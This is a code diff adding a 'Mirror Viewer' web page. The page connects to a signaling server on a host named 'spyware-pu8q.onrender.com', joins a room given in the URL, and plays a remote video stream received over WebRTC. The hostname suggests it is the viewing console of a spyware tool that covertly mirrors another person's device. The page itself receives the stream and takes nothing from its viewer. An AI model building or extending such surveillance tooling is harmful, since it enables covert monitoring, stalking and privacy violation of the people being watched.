@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Mirror Viewer</title>
+  <style>
+    body { font-family: Arial; padding: 20px; }
+    video { width: 90%; margin-top: 10px; border-radius: 10px; background: #000; }
+  </style>
+</head>
+<body>
+
+<h2>Connected</h2>
+<p>Mirroring feed...</p>
+
+<video id="remote" autoplay playsinline></video>
+
+<script>
+const params = new URL(location.href).searchParams;
+const room = params.get("room");
+
+const signalingURL = "wss://spyware-pu8q.onrender.com";
+const ws = new WebSocket(signalingURL);
+
+const pc = new RTCPeerConnection();
+
+pc.onicecandidate = e => {
+  if (e.candidate) {
+    ws.send(JSON.stringify({ type: "ice", candidate: e.candidate }));
+  }
+};
+
+pc.ontrack = (event) => {
+  document.getElementById("remote").srcObject = event.streams[0];
+};
+
+ws.onopen = () => {
+  ws.send(JSON.stringify({ type: "join", room }));
+};
+
+ws.onmessage = async (evt) => {
+  const data = JSON.parse(evt.data);
+
+  if (data.type === "offer") {
+    await pc.setRemoteDescription(data.offer);
+
+    const answer = await pc.createAnswer();
+    await pc.setLocalDescription(answer);
+
+    ws.send(JSON.stringify({ type: "answer", answer }));
+  }
+
+  if (data.type === "ice") {
+    await pc.addIceCandidate(data.candidate);
+  }
+};
+</script>
+
+</body>
+</html>
